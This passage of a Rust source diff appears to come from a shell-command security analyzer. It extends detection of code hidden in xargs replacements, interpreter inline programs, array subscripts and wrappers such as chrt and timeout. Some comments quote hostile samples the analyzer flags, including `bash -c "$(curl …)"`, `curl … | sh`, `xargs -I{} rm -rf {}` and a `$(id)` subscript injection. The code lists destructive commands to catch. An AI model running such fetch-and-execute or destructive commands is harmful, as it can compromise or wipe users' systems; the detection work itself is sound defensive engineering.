+        return ExecutableSubstitutionScan {
+            bodies: Vec::new(),
+            gap: Some(ShellExecutionGap::WorkBudgetExceeded),
+        };
+    }
     let (raw, input_budget_exhausted) = bounded_executable_input(raw);
     let (scan_input, mut heredoc_bodies, heredoc_gap) = if shell == ShellType::Posix {
         let recovery = recover_posix_heredocs(raw);
@@ -7655,6 +8646,15 @@ pub(crate) fn executable_substitution_scan(
     };
     let (scan_input, candidate_budget_exhausted) =
         bounded_executable_candidates(scan_input.as_ref(), shell);
+    // An arithmetic expansion's fixed-output substitutions (`$(( $(nproc) ))`)
+    // are trusted by command name, so this input's own rebinding text counts
+    // as well as the enclosing inputs' (see `posix_arithmetic_is_numeric`).
+    let _shell_state = (shell == ShellType::Posix && scan_input.contains("$((")).then(|| {
+        ShellStateScope::enter(ShellStateChange {
+            rebinds_commands: input_may_rebind_commands(scan_input),
+            sets_variables: false,
+        })
+    });
     let mut scan = if shell == ShellType::PowerShell {
         powershell_executable_substitution_scan(scan_input)
     } else {
@@ -7666,8 +8666,15 @@ pub(crate) fn executable_substitution_scan(
     // (`posix_variable_command_literal_view`); a nested body inherits functions,
     // aliases and variables from the enclosing input (`export -f`, `$(...)`),
     // which a body-local proof cannot see.
-    for segment in tokenize::tokenize(scan_input, shell) {
+    let scan_segments = tokenize::tokenize(scan_input, shell);
+    let array_assignments = if shell == ShellType::Posix {
+        posix_literal_array_assignment_segments(scan_input, &scan_segments)
+    } else {
+        Vec::new()
+    };
+    for (index, segment) in scan_segments.into_iter().enumerate() {
         if shell != ShellType::PowerShell
+            && !array_assignments.get(index).copied().unwrap_or(false)
             && segment.command.as_deref().is_some_and(|command| {
                 !crate::rules::command::command_name_is_statically_bound(command, shell)
             })
@@ -7697,6 +8704,11 @@ pub(crate) fn executable_substitution_scan(
         if posix_eval_crosses_dispatch_state(scan_input, &function_names) {
             record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
         }
+    }
+    // A trusted init emitter is trusted by name, so text that may rebind that
+    // name keeps the unresolved-body gap the eval/source had before.
+    if rebound_init_emitter_operand(scan_input, shell) {
+        record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
     }
     if matches!(shell, ShellType::Posix | ShellType::Fish) {
         scan_literal_posix_aliases(scan_input, shell, &mut scan);
@@ -7799,6 +8811,106 @@ pub(crate) fn literal_posix_function_definition_with_body_kind(
     }
 }
 
+/// Which of `segments` (of `raw`) are literal array element assignments,
+/// `name[subscript]=value` (or `+=`) with nothing after them (bash, zsh,
+/// ksh). An indexed array evaluates its subscript as arithmetic, which
+/// expands variable values recursively (`a='x[$(id)]'; arr[a]=1` runs `id`),
+/// so the subscript must be digits, or a plain key of an array that an
+/// unconditional `typeset -A` / `declare -A` made associative (its keys are
+/// strings). Only such declarations and element assignments may sit between
+/// the declaration and the assignment: any other command (`unset`, `eval`,
+/// a conditional) could change what the name is. Substitutions in the value
+/// are recovered by the executable-body scan like any word's.
+fn posix_literal_array_assignment_segments(raw: &str, segments: &[tokenize::Segment]) -> Vec<bool> {
+    let uncertain = uncertain_posix_state_mutation_segments(raw, segments);
+    let mut associative = std::collections::HashSet::<String>::new();
+    let mut result = Vec::with_capacity(segments.len());
+    for (index, segment) in segments.iter().enumerate() {
+        let element = segment.args.is_empty()
+            && segment
+                .command
+                .as_deref()
+                .and_then(posix_array_element_assignment)
+                .is_some_and(|(name, subscript)| {
+                    let digits = !subscript.is_empty()
+                        && subscript.bytes().all(|byte| byte.is_ascii_digit());
+                    let key = !subscript.is_empty()
+                        && subscript.bytes().all(|byte| {
+                            byte.is_ascii_alphanumeric()
+                                || matches!(byte, b'_' | b'.' | b'-' | b':')
+                        });
+                    digits || (key && associative.contains(name))
+                });
+        result.push(element);
+        if element {
+            continue;
+        }
+        let certain = !uncertain.get(index).copied().unwrap_or(true)
+            && tokenize::leading_env_assignments(&segment.raw).is_empty();
+        let declared = certain
+            .then(|| posix_associative_declaration(segment))
+            .flatten();
+        match declared {
+            Some(names) => associative.extend(names),
+            None => associative.clear(),
+        }
+    }
+    result
+}
+
+/// The names a literal `typeset -A NAME...` / `declare -A NAME...` makes
+/// associative, or `None` for any other command.
+fn posix_associative_declaration(segment: &tokenize::Segment) -> Option<Vec<String>> {
+    if !matches!(
+        literal_posix_segment_command(segment).as_deref(),
+        Some("typeset" | "declare")
+    ) {
+        return None;
+    }
+    let words = segment
+        .args
+        .iter()
+        .map(|word| static_wrapper_word(word, ShellType::Posix))
+        .collect::<Option<Vec<_>>>()?;
+    let options = words
+        .iter()
+        .take_while(|word| word.starts_with(['-', '+']) && word.as_str() != "--")
+        .collect::<Vec<_>>();
+    let associative = options
+        .iter()
+        .any(|option| option.starts_with('-') && !option.starts_with("--") && option.contains('A'));
+    if !associative || options.iter().any(|option| option.starts_with('+')) {
+        return None;
+    }
+    let names = words
+        .iter()
+        .skip(options.len())
+        .map(|word| word.split('=').next().unwrap_or_default().to_string())
+        .collect::<Vec<_>>();
+    (!names.is_empty() && names.iter().all(|name| posix_identifier(name))).then_some(names)
+}
+
+/// A shell identifier: `[A-Za-z_][A-Za-z0-9_]*`.
+fn posix_identifier(name: &str) -> bool {
+    let mut bytes = name.bytes();
+    bytes
+        .next()
+        .is_some_and(|byte| byte.is_ascii_alphabetic() || byte == b'_')
+        && bytes.all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
+}
+
+/// The array name and subscript of an unquoted `name[subscript]=value` /
+/// `name[subscript]+=value` word.
+fn posix_array_element_assignment(word: &str) -> Option<(&str, &str)> {
+    let open = word.find('[')?;
+    let name = &word[..open];
+    let close = open + 1 + word[open + 1..].find(']')?;
+    let subscript = &word[open + 1..close];
+    let rest = &word[close + 1..];
+    (posix_identifier(name) && (rest.starts_with('=') || rest.starts_with("+=")))
+        .then_some((name, subscript))
+}
+
 fn is_complete_literal_posix_brace_group(segment: &tokenize::Segment, shell: ShellType) -> bool {
     if shell != ShellType::Posix || segment.command.as_deref() != Some("{") {
         return false;
@@ -7807,8 +8919,16 @@ fn is_complete_literal_posix_brace_group(segment: &tokenize::Segment, shell: She
     raw.as_bytes().first() == Some(&b'{')
         && find_shell_delimiter_close(raw, 0, ShellType::Posix).is_some_and(|close| {
             raw.get(close + 1..)
-                .is_some_and(|suffix| suffix.trim().is_empty())
+                .is_some_and(posix_suffix_is_only_redirections)
         })
+}
+
+/// Whether `suffix`, the text after a compound command's closing word, holds
+/// nothing but redirections (`> out.txt`, `2>&1`, `>> log </dev/null`), which
+/// do not change what runs inside it. Substitutions in their targets are
+/// recovered by the executable-body scan like any word's.
+fn posix_suffix_is_only_redirections(suffix: &str) -> bool {
+    crate::escalation::args_without_redirections(&tokenize::split_words(suffix)).is_empty()
 }
 
 /// Recover the body of a complete literal POSIX brace group. Brace groups run
@@ -7951,6 +9071,10 @@ fn executable_body_upper_bound_exceeded(raw: &str, shell: ShellType, max_bodies:
             continue;
         }
         match quote {
+            Some(b'\'') if fish_single_quote_escape_byte_at(shell, bytes, index) => {
+                index += 2;
+                continue;
+            }
             Some(b'\'') => {
                 let closes = if shell == ShellType::PowerShell {
                     current_char.and_then(tokenize::powershell_quote_kind)
@@ -8243,6 +9367,7 @@ fn push_literal_wrapper_body(
     match join_static_wrapper_words(args, shell) {
         Some(input) if !input.trim().is_empty() => {
             scan.bodies.push(ExecutableBody {
+                best_effort: false,
                 input,
                 shell: child_shell,
                 origin: None,
@@ -8379,11 +9504,22 @@ fn cmd_start_body_index(args: &[String]) -> Result<Option<usize>, ()> {
     Ok(None)
 }
 
+/// A literal xargs word. POSIX shells leave an empty `{}` pair unexpanded
+/// (brace expansion needs a comma or a `..` range), so `-I{}`, `{}` and
+/// `--replace={}` are literal there; any other brace keeps the word unproven.
+/// fish is left to [`static_wrapper_word`].
+fn xargs_static_word(raw: &str, shell: ShellType) -> Option<String> {
+    if shell != ShellType::Posix || !raw.contains("{}") || raw.contains('\u{1}') {
+        return static_wrapper_word(raw, shell);
+    }
+    static_wrapper_word(&raw.replace("{}", "\u{1}"), shell).map(|word| word.replace('\u{1}', "{}"))
+}
+
 fn scan_xargs_body(args: &[String], shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
     let mut index = 0usize;
     let mut replacement: Option<String> = None;
     while index < args.len() {
-        let Some(option) = static_wrapper_word(&args[index], shell) else {
+        let Some(option) = xargs_static_word(&args[index], shell) else {
             record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
             return;
         };
@@ -8417,36 +9553,37 @@ fn scan_xargs_body(args: &[String], shell: ShellType, scan: &mut ExecutableSubst
                 index += 1;
                 continue;
             }
+            // GNU optional arguments are only ever attached (`--replace=R`):
+            // a bare `--replace` means `{}` and the next word is the command.
+            if matches!(name, "--replace" | "--eof" | "--max-lines") {
+                if name == "--replace" {
+                    replacement = Some(attached.unwrap_or("{}").to_string());
+                }
+                index += 1;
+                continue;
+            }
             if matches!(
                 name,
                 "--arg-file"
                     | "--delimiter"
-                    | "--eof"
-                    | "--replace"
-                    | "--max-lines"
                     | "--max-args"
                     | "--max-procs"
                     | "--max-chars"
                     | "--process-slot-var"
             ) {
-                let value = if let Some(value) = attached {
-                    value.to_string()
-                } else {
-                    let Some(value) = args
+                if attached.is_none() {
+                    if args
                         .get(index + 1)
-                        .and_then(|value| static_wrapper_word(value, shell))
-                    else {
+                        .and_then(|value| xargs_static_word(value, shell))
+                        .is_none()
+                    {
                         record_shell_execution_gap(
                             scan,
                             ShellExecutionGap::AmbiguousExecutableBody,
                         );
                         return;
-                    };
+                    }
                     index += 1;
-                    value
-                };
-                if name == "--replace" {
-                    replacement = Some(value);
                 }
                 index += 1;
                 continue;
@@ -8481,7 +9618,7 @@ fn scan_xargs_body(args: &[String], shell: ShellType, scan: &mut ExecutableSubst
                 let value = if attached.is_empty() {
                     consumed_next = true;
                     args.get(index + 1)
-                        .and_then(|value| static_wrapper_word(value, shell))
+                        .and_then(|value| xargs_static_word(value, shell))
                 } else {
                     Some(attached.to_string())
                 };
@@ -8508,18 +9645,264 @@ fn scan_xargs_body(args: &[String], shell: ShellType, scan: &mut ExecutableSubst
         // With no utility operand, xargs executes its fixed default `echo`.
         return;
     };
-    let Some(first_static) = static_wrapper_word(first, shell) else {
+    let Some(first_static) = xargs_static_word(first, shell) else {
         record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
         return;
     };
-    if replacement
-        .as_deref()
-        .is_some_and(|replacement| !replacement.is_empty() && first_static.contains(replacement))
-    {
-        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-        return;
+    let utility = args.get(index..).unwrap_or_default();
+    if let Some(replacement) = replacement.as_deref().filter(|value| !value.is_empty()) {
+        // xargs substitutes each input item for every occurrence of the
+        // replacement string, so an item in the command name or in code a
+        // child interpreter runs is input data executed as code.
+        if first_static.contains(replacement)
+            || xargs_placeholder_reaches_code(utility, replacement, shell)
+        {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return;
+        }
     }
-    push_control_prefix_body(args.get(index..).unwrap_or_default(), shell, scan);
+    push_control_prefix_body(utility, shell, scan);
+}
+
+/// Whether an `xargs -I REPL` input item substituted into `utility` (the
+/// command xargs runs and its arguments) lands in code: the command name, the
+/// `-c` script of a shell, the inline program of another interpreter, the
+/// remote command of `ssh`, or any argument of a command that runs its
+/// arguments as a command line (`eval`, `watch`, `su`, ...). An item that
+/// names what a destructive filesystem command (`rm`, `mv`, `chmod`, ...)
+/// acts on is kept unresolved too: the targets come from data the analysis
+/// cannot see (`echo / | xargs -I{} rm -rf {}`). An argument of an ordinary
+/// command (`cp REPL backup/`, `git branch -d REPL`) and a shell script
+/// operand (as `xargs sh` runs) are data. Anything that cannot be resolved
+/// counts as code.
+fn xargs_placeholder_reaches_code(utility: &[String], replacement: &str, shell: ShellType) -> bool {
+    // Lowercase: the resolver folds command names to lowercase.
+    const ITEM: &str = "tirithxargsitem";
+    // xargs replaces inside the words the shell hands it (quotes removed),
+    // so compare and substitute those, then requote them for the resolver.
+    let Some(words) = utility
+        .iter()
+        .map(|word| xargs_static_word(word, shell))
+        .collect::<Option<Vec<_>>>()
+    else {
+        return true;
+    };
+    if !words.iter().any(|word| word.contains(replacement)) {
+        return false;
+    }
+    let line = words
+        .iter()
+        .map(|word| {
+            let word = word.replace(replacement, ITEM);
+            if !word.is_empty()
+                && word
+                    .bytes()
+                    .all(|byte| byte.is_ascii_alphanumeric() || b"_./:=@%+,-".contains(&byte))
+            {
+                word
+            } else {
+                format!("'{}'", word.replace('\'', "'\\''"))
+            }
+        })
+        .collect::<Vec<_>>()
+        .join(" ");
+    let segments = tokenize::tokenize(&line, ShellType::Posix);
+    let [segment] = segments.as_slice() else {
+        return true;
+    };
+    let Some((command, args)) = resolve_wrapped_command_for_shell(segment, ShellType::Posix) else {
+        return true;
+    };
+    if command.to_ascii_lowercase().contains(ITEM) {
+        return true;
+    }
+    if !args
+        .iter()
+        .any(|arg| arg.to_ascii_lowercase().contains(ITEM))
+    {
+        return false;
+    }
+    let command = crate::rules::command::normalize_cmd_base(&command, ShellType::Posix);
+    // The words the child receives (quotes removed); `None` when one is not
+    // literal, which counts as code.
+    let Some(literal_args) = args
+        .iter()
+        .map(|arg| static_wrapper_word(arg, ShellType::Posix))
+        .collect::<Option<Vec<_>>>()
+    else {
+        return true;
+    };
+    match command.as_str() {
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" | "fish" => {
+            // The `-c` command string (after every option: `sh -c -e REPL`)
+            // and fish `-c` / `-C` values are code; a script operand and its
+            // arguments are data.
+            shell_command_operands(&args, ShellType::Posix, command == "fish")
+                .into_iter()
+                .any(|index| args.get(index).is_none_or(|body| body.contains(ITEM)))
+        }
+        "awk" | "gawk" | "nawk" | "mawk" => awk_program_contains(&literal_args, ITEM),
+        "ssh" => {
+            let mut index = 0usize;
+            while index < args.len() {
+                let Some(word) = static_wrapper_word(&args[index], ShellType::Posix) else {
+                    return true;
+                };
+                if word == "--" {
+                    index += 1;
+                    break;
+                }
+                let Some(flags) = word.strip_prefix('-').filter(|flags| !flags.is_empty()) else {
+                    break;
+                };
+                let takes_value = flags
+                    .char_indices()
+                    .find(|(_, flag)| SSH_VALUE_OPTIONS.contains(*flag))
+                    .is_some_and(|(offset, flag)| offset + flag.len_utf8() == flags.len());
+                index += if takes_value { 2 } else { 1 };
+            }
+            // The host, then the remote command line.
+            args.iter().skip(index + 1).any(|arg| arg.contains(ITEM))
+        }
+        base if crate::rules::command::INTERPRETERS.contains(&base) => {
+            if interpreter_inline_programs_contain(base, &literal_args, ITEM) {
+                // Any `-e` body, not only the first (`perl -e 1 -e REPL`).
+                return true;
+            }
+            match posix_non_shell_interpreter_input_mode(base, &args) {
+                Some(PosixInterpreterInputMode::InlineProgram(body)) => body.contains(ITEM),
+                Some(
+                    PosixInterpreterInputMode::FixedProgram
+                    | PosixInterpreterInputMode::StdinProgram,
+                ) => false,
+                _ => true,
+            }
+        }
+        "rm" | "rmdir" | "unlink" | "shred" | "mv" | "chmod" | "chown" | "chgrp" | "rsync"
+        | "dd" | "truncate" => true,
+        "eval" | "source" | "." | "exec" | "command" | "builtin" | "env" | "sudo" | "doas"
+        | "su" | "runuser" | "watch" | "script" | "busybox" | "toybox" | "xargs" | "parallel"
+        | "find" | "nohup" | "nice" | "timeout" | "time" | "stdbuf" | "setsid" | "chroot"
+        | "flock" | "ionice" | "taskset" | "unbuffer" | "powershell" => true,
+        _ => false,
+    }
+}
+
+/// Whether any inline program an interpreter invocation names contains
+/// `needle`: every `-e` / `-E` body of perl, ruby or node (`--eval`, `-p`,
+/// `--print`), python `-c` and php `-r`, attached or not, up to the first
+/// operand. `args` are already literal words.
+fn interpreter_inline_programs_contain(command: &str, args: &[String], needle: &str) -> bool {
+    let (inline, value): (&[&str], &[&str]) = match command {
+        "python" | "python2" | "python3" => (&["-c"], &["-W", "-X", "-Q", "-m"]),
+        "node" => (
+            &["-e", "--eval", "-p", "--print"],
+            &["-r", "--require", "--loader", "--import"],
+        ),
+        "perl" => (&["-e", "-E"], &["-I", "-M", "-m"]),
+        "ruby" => (&["-e"], &["-I", "-r"]),
+        "php" => (&["-r"], &["-d", "-c", "-f"]),
+        _ => return false,
+    };
+    let mut index = 0usize;
+    while index < args.len() {
+        let word = args[index].as_str();
+        if word == "--" || !word.starts_with('-') || word == "-" {
+            return false;
+        }
+        if inline.contains(&word) {
+            if args
+                .get(index + 1)
+                .is_some_and(|body| body.contains(needle))
+            {
+                return true;
+            }
+            index += 2;
+            continue;
+        }
+        if inline.iter().any(|flag| word.starts_with(flag)) && word.contains(needle) {
+            return true;
+        }
+        index += if value.contains(&word) { 2 } else { 1 };
+    }
+    false
+}
+
+/// Whether an awk invocation's program text contains `needle`: the first
+/// operand when no `-f` / `--file` / `-E` / `--exec` program file is given,
+/// and every `-e` / `--source` value (gawk). The program decides what awk runs
+/// (`system()`, pipes to `sh`); later operands are input files and `var=value`
+/// assignments. An option this does not know that contains `needle` counts.
+/// `args` are already literal words.
+fn awk_program_contains(args: &[String], needle: &str) -> bool {
+    let mut program_file = false;
+    let mut index = 0usize;
+    while index < args.len() {
+        let word = args[index].as_str();
+        if word == "--" {
+            return !program_file
+                && args
+                    .get(index + 1)
+                    .is_some_and(|program| program.contains(needle));
+        }
+        if !word.starts_with('-') || word == "-" {
+            return !program_file && word.contains(needle);
+        }
+        let (name, attached) = match word.split_once('=') {
+            Some((name, value)) if word.starts_with("--") => (name, Some(value)),
+            _ => (word, None),
+        };
+        let long_value = |names: &[&str]| names.contains(&name);
+        if long_value(&["--source", "-e"]) {
+            let value = attached.or_else(|| args.get(index + 1).map(String::as_str));
+            if value.is_some_and(|value| value.contains(needle)) {
+                return true;
+            }
+            index += if attached.is_some() { 1 } else { 2 };
+            continue;
+        }
+        if long_value(&["--file", "-f", "--exec", "-E"]) {
+            program_file = true;
+            index += if attached.is_some() { 1 } else { 2 };
+            continue;
+        }
+        if long_value(&[
+            "-F",
+            "-v",
+            "-i",
+            "-l",
+            "-W",
+            "--field-separator",
+            "--assign",
+            "--include",
+            "--load",
+        ]) {
+            index += if attached.is_some() { 1 } else { 2 };
+            continue;
+        }
+        if let Some(short) = word
+            .strip_prefix('-')
+            .filter(|short| !short.starts_with('-'))
+        {
+            // Attached values: `-F,`, `-vX=1`, `-fprog.awk`, `-e'code'`.
+            match short.chars().next() {
+                Some('e') if short[1..].contains(needle) => return true,
+                Some('f' | 'E') => program_file = true,
+                _ => {}
+            }
+            if !matches!(
+                short.chars().next(),
+                Some('F' | 'v' | 'f' | 'e' | 'E' | 'i' | 'l' | 'W')
+            ) && word.contains(needle)
+            {
+                return true;
+            }
+        } else if word.contains(needle) {
+            return true;
+        }
+        index += 1;
+    }
+    false
 }
 
 fn scan_find_exec_bodies(args: &[String], shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
@@ -8614,6 +9997,7 @@ fn scan_cmd_for_f_command(args: &[String], scan: &mut ExecutableSubstitutionScan
             record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
         } else {
             scan.bodies.push(ExecutableBody {
+                best_effort: false,
                 input: body.to_string(),
                 shell: ShellType::Cmd,
                 origin: None,
@@ -8656,6 +10040,7 @@ fn scan_cmd_cli_body(
                 record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
             } else {
                 scan.bodies.push(ExecutableBody {
+                    best_effort: false,
                     input,
                     shell: ShellType::Cmd,
                     origin: None,
@@ -8700,6 +10085,7 @@ fn scan_cmd_cli_body(
                 });
             if let Some(input) = for_body {
                 scan.bodies.push(ExecutableBody {
+                    best_effort: false,
                     input,
                     shell: ShellType::Cmd,
                     origin: None,
@@ -8775,162 +10161,468 @@ fn push_static_child_from(
     }
 }
 
+/// External programs that run a child command, read in fish with the same
+/// option grammar as POSIX (`scan_posix_delegation_utility`).
+const FISH_EXTERNAL_WRAPPERS: &[&str] = &[
+    "nice", "timeout", "setsid", "stdbuf", "taskset", "ionice", "flock", "chrt",
+];
+
+/// `chrt PRIORITY COMMAND`'s child in a POSIX shell, which the released
+/// analysis never read (`chrt 10 bash -c "$(curl …)"`). As with fish's
+/// external wrappers ([`push_fish_wrapper_child`]), a child the grammar proves
+/// is a best-effort body: it adds the findings its own analysis proves, never
+/// an analysis gap, and an unproven child (`chrt $PRIO cmd`, a dynamic
+/// priority) keeps the released verdict instead of becoming an
+/// incomplete-analysis block.
+fn push_best_effort_delegation_child(
+    wrapper: &str,
+    args: &[String],
+    segment: &tokenize::Segment,
+    shell: ShellType,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    let mut child = ExecutableSubstitutionScan::default();
+    scan_posix_delegation_utility(wrapper, args, shell, &mut child);
+    if child.gap.is_some() {
+        return;
+    }
+    for mut body in child.bodies {
+        body.best_effort = true;
+        body.origin.get_or_insert_with(|| ExecutableBodyOrigin {
+            parent_range: segment.byte_range.clone(),
+            relation: ExecutableRelation::WrapperReplacement,
+        });
+        scan.bodies.push(body);
+    }
+}
+
+/// How many directly nested fish wrappers one pass flattens. A longer chain
+/// continues in the next body, so this bounds work, not coverage.
+const MAX_FISH_WRAPPER_CHAIN: usize = 32;
+
+/// fish runs an external wrapper's child command like any shell does, but the
+/// released fish analysis never read it. A child the wrapper grammar proves is
+/// analyzed as a best-effort body: it may add findings its own analysis proves
+/// (an inline payload, `curl … | sh`), never an analysis gap, so a command fish
+/// allowed in 0.4.2 cannot become an incomplete-analysis block. An unproven
+/// child (`timeout $T …`) keeps the released verdict. A chain of wrappers
+/// (`nice nice … sh -c …`) is flattened to its innermost child so a long prefix
+/// cannot push the payload past the nested-body depth limit.
+fn push_fish_wrapper_child(
+    wrapper: &str,
+    args: &[String],
+    segment: &tokenize::Segment,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    let shell = ShellType::Fish;
+    let mut child = ExecutableSubstitutionScan::default();
+    scan_posix_delegation_utility(wrapper, args, shell, &mut child);
+    if child.gap.is_some() {
+        return;
+    }
+    for _ in 0..MAX_FISH_WRAPPER_CHAIN {
+        let [body] = child.bodies.as_slice() else {
+            break;
+        };
+        let segments = tokenize::tokenize(&body.input, shell);
+        let [inner_segment] = segments.as_slice() else {
+            break;
+        };
+        // Flatten only a bare wrapper word. A peeled `sudo`/`env` layer stays
+        // in the body so the rules for that layer still see it.
+        let Some(leader) = inner_segment
+            .command
+            .as_deref()
+            .map(|leader| crate::rules::command::normalize_cmd_base(leader, shell))
+            .filter(|leader| FISH_EXTERNAL_WRAPPERS.contains(&leader.as_str()))
+        else {
+            break;
+        };
+        let mut next = ExecutableSubstitutionScan::default();
+        scan_posix_delegation_utility(&leader, &inner_segment.args, shell, &mut next);
+        if next.gap.is_some() || next.bodies.is_empty() {
+            break;
+        }
+        child = next;
+    }
+    for mut body in child.bodies {
+        body.best_effort = true;
+        // The wrapper hands the child its own stdin/stdout/stderr, exactly as
+        // a shell wrapper hands them to its `-c` body.
+        body.origin.get_or_insert_with(|| ExecutableBodyOrigin {
+            parent_range: segment.byte_range.clone(),
+            relation: ExecutableRelation::WrapperReplacement,
+        });
+        scan.bodies.push(body);
+    }
+}
+
+/// One option word of a delegation utility, as parsed by GNU `getopt`.
+struct StaticWrapperOption {
+    /// Argv words consumed (2 when the value is the following word).
+    words: usize,
+    /// The long option name, or every letter of a short-option cluster.
+    long: Option<&'static str>,
+    letters: Vec<char>,
+}
+
+impl StaticWrapperOption {
+    fn names(&self, long: &[&str], short: &[char]) -> bool {
+        self.long.is_some_and(|name| long.contains(&name))
+            || self.letters.iter().any(|letter| short.contains(letter))
+    }
+
+    /// `--help`/`--version` style options print and exit: no child runs.
+    fn terminal(&self, long: &[&str], short: &[char]) -> bool {
+        self.names(long, short)
+    }
+}
+
+/// One GNU `getopt` short-option cluster (`-fw`, `-k1`, `-sKILL`, `-c 0`).
+/// `None` for a letter outside `flags`/`valued`, or a value option whose value
+/// is missing or not static: the child position is then unknown.
+fn static_short_option_cluster(
+    option: &str,
+    next: Option<&String>,
+    flags: &[char],
+    valued: &[char],
+    shell: ShellType,
+) -> Option<StaticWrapperOption> {
+    let letters = option
+        .strip_prefix('-')
+        .filter(|letters| !letters.is_empty() && !letters.starts_with('-'))?;
+    let mut seen = Vec::new();
+    for (offset, letter) in letters.char_indices() {
+        seen.push(letter);
+        if flags.contains(&letter) {
+            continue;
+        }
+        if !valued.contains(&letter) {
+            return None;
+        }
+        // The rest of the cluster is the value; otherwise the next word is.
+        let words = if offset + letter.len_utf8() < letters.len() {
+            1
+        } else {
+            next.and_then(|arg| static_wrapper_word(arg, shell))?;
+            2
+        };
+        return Some(StaticWrapperOption {
+            words,
+            long: None,
+            letters: seen,
+        });
+    }
+    Some(StaticWrapperOption {
+        words: 1,
+        long: None,
+        letters: seen,
+    })
+}
+
+/// A GNU long option spelled in full (`--signal=KILL`, `--signal KILL`,
+/// `--fork`). `None` for an unknown or abbreviated name, a value on a flag, or
+/// a value option without a static value.
+fn static_long_option(
+    option: &str,
+    next: Option<&String>,
+    flags: &[&'static str],
+    valued: &[&'static str],
+    shell: ShellType,
+) -> Option<StaticWrapperOption> {
+    let (name, attached) = option
+        .split_once('=')
+        .map_or((option, None), |(name, value)| (name, Some(value)));
+    if let Some(flag) = flags.iter().find(|flag| **flag == name) {
+        return attached.is_none().then(|| StaticWrapperOption {
+            words: 1,
+            long: Some(flag),
+            letters: Vec::new(),
+        });
+    }
+    let valued = valued.iter().find(|valued| **valued == name)?;
+    let words = match attached {
+        Some(value) if !value.is_empty() => 1,
+        Some(_) => return None,
+        None => {
+            next.and_then(|arg| static_wrapper_word(arg, shell))?;
+            2
+        }
+    };
+    Some(StaticWrapperOption {
+        words,
+        long: Some(valued),
+        letters: Vec::new(),
+    })
+}
+
+/// Whether a wrapper operand is exactly one positional argv word after
+/// expansion even if its value is not static: a literal, a literal under a
+/// leading `~/`, or one double-quoted string that starts with a literal path
+/// byte (`"/run/$USER.lock"`). An unquoted variable, glob, brace list, or
+/// command substitution can expand to any number of words, and a word that
+/// may expand to a leading `-` (`"$LOCK"`) may be read as an option.
+fn wrapper_operand_is_one_word(raw: &str, shell: ShellType) -> bool {
+    if let Some(word) = static_wrapper_word(raw, shell) {
+        return !word.starts_with('-');
+    }
+    if !matches!(shell, ShellType::Posix | ShellType::Fish) {
+        return false;
+    }
+    if let Some(rest) = raw.strip_prefix("~/") {
+        return rest.is_empty() || static_wrapper_word(rest, shell).is_some();
+    }
+    let Some(inner) = raw
+        .strip_prefix('"')
+        .and_then(|rest| rest.strip_suffix('"'))
+    else {
+        return false;
+    };
+    // Only literal path bytes and plain `$NAME` / `${NAME}` references: a
+    // quoted `"$@"` or `"${arr[@]}"` still expands to many words, and a
+    // nested substitution or quote stays unproven.
+    let bytes = inner.as_bytes();
+    if !bytes
+        .first()
+        .is_some_and(|byte| byte.is_ascii_alphanumeric() || b"/._".contains(byte))
+    {
+        return false;
+    }
+    let name_byte = |byte: u8| byte.is_ascii_alphanumeric() || byte == b'_';
+    let mut index = 0usize;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'$' if shell == ShellType::Posix && bytes.get(index + 1) == Some(&b'{') => {
+                let name_len = bytes[index + 2..]
+                    .iter()
+                    .take_while(|byte| name_byte(**byte))
+                    .count();
+                if name_len == 0 || bytes.get(index + 2 + name_len) != Some(&b'}') {
+                    return false;
+                }
+                index += name_len + 3;
+            }
+            b'$' => {
+                let name_len = bytes[index + 1..]
+                    .iter()
+                    .take_while(|byte| name_byte(**byte))
+                    .count();
+                if name_len == 0 {
+                    return false;
+                }
+                index += name_len + 1;
+            }
+            byte if byte.is_ascii_alphanumeric() || b"/._-+:,%~".contains(&byte) => index += 1,
+            _ => return false,
+        }
+    }
+    true
+}
+
+/// Where a delegation utility's child command starts, read with the
+/// utility's own option grammar. Shared by the executable-body scan
+/// ([`scan_posix_delegation_utility`]) and the pipe-sink interpreter
+/// resolution in `rules::command`, so the two readings cannot drift.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum DelegationChild {
+    /// The child command's argv starts at this index (past the end when the
+    /// utility was given no command).
+    Argv(usize),
+    /// `flock FILE -c COMMAND`: the one command string at this index, which
+    /// flock runs with `$SHELL -c`.
+    CommandString(usize),
+    /// Nothing runs: help or version output, an existing-process mode, or a
+    /// missing operand.
+    Nothing,
+    /// The child position depends on a word that is not static.
+    Ambiguous,
+}
+
 fn scan_posix_delegation_utility(
     command: &str,
     args: &[String],
     shell: ShellType,
     scan: &mut ExecutableSubstitutionScan,
 ) {
+    match delegation_utility_child(command, args, shell) {
+        DelegationChild::Argv(index) => push_static_child_from(args, index, shell, scan),
+        DelegationChild::CommandString(index) => push_required_literal_wrapper_body(
+            args.get(index..).unwrap_or_default(),
+            shell,
+            shell,
+            scan,
+        ),
+        DelegationChild::Nothing => {}
+        DelegationChild::Ambiguous => {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody)
+        }
+    }
+}
+
+pub(crate) fn delegation_utility_child(
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+) -> DelegationChild {
     let mut index = 0usize;
     match command {
-        "noglob" | "nocorrect" => {
-            push_static_child_from(args, 0, shell, scan);
-        }
+        "noglob" | "nocorrect" => DelegationChild::Argv(0),
         "repeat" => {
             let Some(count) = args.first().and_then(|arg| static_wrapper_word(arg, shell)) else {
-                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                return;
+                return DelegationChild::Ambiguous;
             };
             if !count.chars().all(|ch| ch.is_ascii_digit()) {
